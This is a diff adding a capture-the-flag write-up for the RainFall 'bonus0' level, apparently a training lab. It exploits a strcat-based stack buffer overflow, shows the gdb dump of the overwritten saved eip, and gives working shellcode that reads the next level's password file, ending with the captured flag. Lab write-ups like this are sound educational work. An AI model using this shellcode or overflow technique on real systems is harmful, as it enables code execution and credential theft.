@@ -1,2 +1,42 @@
 echo `python -c 'print "A"*1024 + "B"*1024 + "C" * 1024 + "D"*1023'` > /tmp/test
 echo `python -c 'print "abcdefghi"+"\x68\xf8\xff\xbf"+"nopqrstuvwxyz"'` >> /tmp/test
+
+The binary call the function "pp" who calls twice the function "p".
+This function call a read in the , then strchr search a '\n' in the buffer filled by read.
+
+After that the pp function call strcat.
+
+The goal is to rewrite the eip with a shellcode.
+First we send a lot of character to see is the eip is filled by the hexa code of "A".
+
+bonus0@RainFall:~$ echo `python -c 'print "A" * 4000'` > /tmp/test
+bonus0@RainFall:~$ echo `python -c 'print "A" * 4000'` >> /tmp/test
+bonus0@RainFall:~$ ./bonus0 < /tmp/test
+ -
+ -
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�� AAAAAAAAAAAAAAAAAAAA��
+Segmentation fault (core dumped)
+
+In gdb we can see that the eip is rewrited:
+(gdb) info frame
+Stack level 0, frame at 0xbffff730:
+ eip = 0x80485c0 in main; saved eip 0x41414141
+ Arglist at 0xbffff728, args:
+ Locals at 0xbffff728, Previous frame's sp is 0xbffff730
+ Saved registers:
+  ebp at 0xbffff728, eip at 0xbffff72c
+(gdb)
+
+So now we just need create a shelcode and fill the file with shellcode's address :
+export SHELLCODE=`python -c 'print "\x90"*100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/bonus1/.pass;exit;"'`
+
+the shellcode address : 0xbffff868
+
+the exploit : 
+bonus0@RainFall:~$ echo `python -c 'print "\x68\xf8\xff\xbf" * 1000'` > /tmp/test
+bonus0@RainFall:~$ echo `python -c 'print "\x68\xf8\xff\xbf" * 1000'` >> /tmp/test
+bonus0@RainFall:~$ ./bonus0 < /tmp/test
+ -
+ -
+h���h���h���h���h����h���h���h���h���h���� �h���h���h���h���h����
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
